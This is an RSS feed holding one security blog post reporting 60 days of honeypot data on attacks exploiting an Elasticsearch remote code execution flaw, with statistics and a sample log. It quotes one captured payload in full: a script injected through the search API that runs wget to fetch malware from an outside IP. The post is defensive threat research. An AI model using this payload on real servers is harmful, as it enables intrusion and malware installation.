<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Elastichoney on Jordan Wright</title>
    <link>http://jordan-wright.com/blog/tags/elastichoney/</link>
    <description>Recent content in Elastichoney on Jordan Wright</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 30 Apr 2015 20:00:00 +0000</lastBuildDate>
    <atom:link href="http://jordan-wright.com/blog/tags/elastichoney/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>60 Days of Watching Hackers Attack Elasticsearch</title>
      <link>http://jordan-wright.com/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/</link>
      <pubDate>Thu, 30 Apr 2015 20:00:00 +0000</pubDate>
      
      <guid>http://jordan-wright.com/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/</guid>
      <description>

&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/elk_results.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;


&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;Two months ago, one of my DigitalOcean instances started attacking another host with massive amounts of bogus traffic. I was notified by the abuse team at DO that my VPS was participating in a DDoS attack. I managed to track down that the attackers leveraged an &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#34;&gt;RCE vulnerability in Elasticsearch&lt;/a&gt; to automatically download and run malware.&lt;/p&gt;

&lt;p&gt;After re-building the box from scratch (with many improvements!), I &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/&#34;&gt;created a honeypot&lt;/a&gt; called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I&amp;rsquo;ve had multiple sensors silently logging all attempts to exploit this vulnerability.&lt;/p&gt;

&lt;p&gt;Here are the results.&lt;/p&gt;

&lt;h3 id=&#34;who-s-attacking-me&#34;&gt;Who&amp;rsquo;s Attacking Me?&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/jordan-wright/elastichoney&#34;&gt;Elastichoney&lt;/a&gt; keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony - free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.&lt;/p&gt;

&lt;p&gt;So far, I&amp;rsquo;ve had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/map.png&#34;/&gt;&lt;/p&gt;

&lt;p&gt;The second thing that I noticed was how fast the majority of exploit attempts died down. Here&amp;rsquo;s a histogram of attack attempts since the sensors have been running:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/elastichoney_elk/histogram.png&#34;/&gt;&lt;/p&gt;

&lt;p&gt;You&amp;rsquo;ll notice a spike between March 20&lt;sup&gt;th&lt;/sup&gt; and April 11&lt;sup&gt;th&lt;/sup&gt;. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. &lt;a href=&#34;http://cdn.meme.am/instances/500x/58834359.jpg&#34;&gt;You can&amp;rsquo;t explain that.&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;what-are-the-attackers-doing&#34;&gt;What are the Attackers Doing?&lt;/h3&gt;

&lt;p&gt;I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like &lt;code&gt;whoami&lt;/code&gt;, etc. However, in quite a few cases, the malware attempted to use &lt;code&gt;wget&lt;/code&gt; to download and run malware - similar to what happened to my DO instance.&lt;/p&gt;

&lt;p&gt;These looked something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;source={&amp;quot;query&amp;quot;:+{&amp;quot;filtered&amp;quot;:+{&amp;quot;query&amp;quot;:+{&amp;quot;match_all&amp;quot;:+{}}}},+&amp;quot;script_fields&amp;quot;:+{&amp;quot;exp&amp;quot;:+{&amp;quot;script&amp;quot;:+&amp;quot;import+java.util.*;import+java.io.*;String+str+=+\&amp;quot;\&amp;quot;;BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\&amp;quot;wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\&amp;quot;).getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\&amp;quot;\r\n\&amp;quot;);}sb.toString();&amp;quot;}},+&amp;quot;size&amp;quot;:+1}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we&amp;rsquo;re working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs&amp;hellip;&lt;/p&gt;

&lt;h3 id=&#34;the-raw-data&#34;&gt;The Raw Data&lt;/h3&gt;

&lt;p&gt;I&amp;rsquo;m a fan of open-sourcing as much information as possible if it helps the community. As such, I&amp;rsquo;ve decided to release all the logs I currently have.&lt;/p&gt;

&lt;p&gt;You can download the raw JSON logs &lt;a href=&#34;http://jordan-wright.com/blog/downloads/elastichoney_logs.json.gz&#34;&gt;here&lt;/a&gt;. Here&amp;rsquo;s an example log to show how the logs are structured:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
    &amp;quot;source&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
    &amp;quot;@timestamp&amp;quot;: &amp;quot;2015-05-10T15:44:56.803Z&amp;quot;,
    &amp;quot;url&amp;quot;: &amp;quot;x.x.x.x:9200/_search?&amp;quot;,
    &amp;quot;method&amp;quot;: &amp;quot;GET&amp;quot;,
    &amp;quot;form&amp;quot;: &amp;quot;form_payload&amp;quot;,
    &amp;quot;payload&amp;quot;: &amp;quot;json_payload&amp;quot;,
    &amp;quot;headers&amp;quot;: {
        &amp;quot;user_agent&amp;quot;: &amp;quot;python-requests/2.4.1 CPython/2.7.8 Windows/2003Server&amp;quot;,
        &amp;quot;host&amp;quot;: &amp;quot;x.x.x.x:9200&amp;quot;,
        &amp;quot;content_type&amp;quot;: &amp;quot;&amp;quot;,
        &amp;quot;accept_language&amp;quot;: &amp;quot;&amp;quot;
    },
    &amp;quot;type&amp;quot;: &amp;quot;attack&amp;quot;,
    &amp;quot;honeypot&amp;quot;: &amp;quot;x.x.x.x&amp;quot;,
    &amp;quot;@version&amp;quot;: &amp;quot;1&amp;quot;,
    &amp;quot;host&amp;quot;: &amp;quot;127.0.0.1:39642&amp;quot;,
    &amp;quot;name&amp;quot;: &amp;quot;Python Requests&amp;quot;,
    &amp;quot;os&amp;quot;: &amp;quot;Windows&amp;quot;,
    &amp;quot;os_name&amp;quot;: &amp;quot;Windows&amp;quot;,
    &amp;quot;device&amp;quot;: &amp;quot;Other&amp;quot;,
    &amp;quot;major&amp;quot;: &amp;quot;2&amp;quot;,
    &amp;quot;minor&amp;quot;: &amp;quot;4&amp;quot;,
    &amp;quot;geoip&amp;quot;: {
        &amp;quot;ip&amp;quot;: &amp;quot;222.186.56.46&amp;quot;,
        &amp;quot;country_code2&amp;quot;: &amp;quot;CN&amp;quot;,
        &amp;quot;country_code3&amp;quot;: &amp;quot;CHN&amp;quot;,
        &amp;quot;country_name&amp;quot;: &amp;quot;China&amp;quot;,
        &amp;quot;continent_code&amp;quot;: &amp;quot;AS&amp;quot;,
        &amp;quot;region_name&amp;quot;: &amp;quot;04&amp;quot;,
        &amp;quot;city_name&amp;quot;: &amp;quot;Nanjing&amp;quot;,
        &amp;quot;latitude&amp;quot;: 32.0617,
        &amp;quot;longitude&amp;quot;: 118.77780000000001,
        &amp;quot;timezone&amp;quot;: &amp;quot;Asia/Shanghai&amp;quot;,
        &amp;quot;real_region_name&amp;quot;: &amp;quot;Jiangsu&amp;quot;,
        &amp;quot;location&amp;quot;: [118.77780000000001, 32.0617]
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As always, let me know if you have any questions or comments below!&lt;/p&gt;

&lt;p&gt;Enjoy!&lt;/p&gt;

&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>